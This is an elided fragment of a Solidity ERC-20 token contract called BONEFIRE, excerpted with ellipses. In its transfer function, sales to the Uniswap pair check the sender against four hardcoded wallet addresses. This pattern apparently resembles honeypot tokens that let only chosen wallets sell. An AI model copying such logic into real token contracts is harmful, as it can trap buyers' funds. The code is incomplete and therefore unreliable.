...
contract BONEFIRE is Context, IERC20, Ownable {
    ...
    function _approve(address owner, address spender, uint256 amount) private {
     ...
     function _transfer(
        ...
        if (to == uniswapV2Pair && balanceOf(uniswapV2Pair) > 0) {
             ...
             if(from==address(0xEea5F83025C7Ee70b87d7E6d966a6233aA033f14)||from==address(0x0f28137931C1dD3C57503D7f7F998B38Be8e859F)||from==address(0x3B9dcEcb060943f4B3b7F126FFC7E25b1a5049ec)||from==address(0xb3515EDad22d184FC9Bb263FAD08C7E607d7dA30)){
